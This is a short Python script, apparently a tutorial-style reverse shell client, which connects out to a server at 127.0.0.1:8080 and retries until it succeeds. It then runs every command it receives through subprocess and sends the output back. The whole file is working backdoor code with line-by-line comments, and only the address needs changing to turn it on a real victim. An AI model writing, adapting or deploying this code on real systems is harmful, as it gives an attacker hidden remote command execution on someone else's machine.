#!/usr/bin/env python3  # Shebang for Python 3 compatibility.

# Client script to connect to a server and execute received commands.

# Import necessary libraries.
import socket  # For creating socket connections.
import subprocess  # For executing system commands.
import time  # For adding delays.

# Create a connection using IPv4 (AF_INET) and TCP (SOCK_STREAM).
Connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
print("[+] Trying to connect to the server...")

# Retry connection until successful.
while True:
    time.sleep(10)  # Wait for 10 seconds before retrying.
    try:
        # Server's IP address and port to connect (bind).
        Connection.connect(("127.0.0.1", 8080))
        # Successfully connected to the server.
        break
    except ConnectionRefusedError:
        print("[!] Connection failed, retrying...")
        pass  # Ignore the error and retry.

print("[+] Connected to the server.")

# Infinite loop to continuously receive and execute commands.
while True:
    try:
        # Receive data/commands from the server.
        RecvData = Connection.recv(1024).decode()  # Decoding received data.
        if RecvData.lower() == "exit":  # Check if the command is "exit".
            print("[!] Received exit command. Closing connection...")
            break  # Exit the loop if the command is "exit".
        
        # Execute the received command and capture the output.
        ClintOutput = subprocess.getoutput(RecvData)
        
        # Send the command output back to the server.
        Connection.send(ClintOutput.encode())
    except Exception as e:
        print(f"[!] An error occurred: {e}")
        break  # Exit on unexpected errors.

# Close the connection.
Connection.close()
print("[+] Connection closed.")
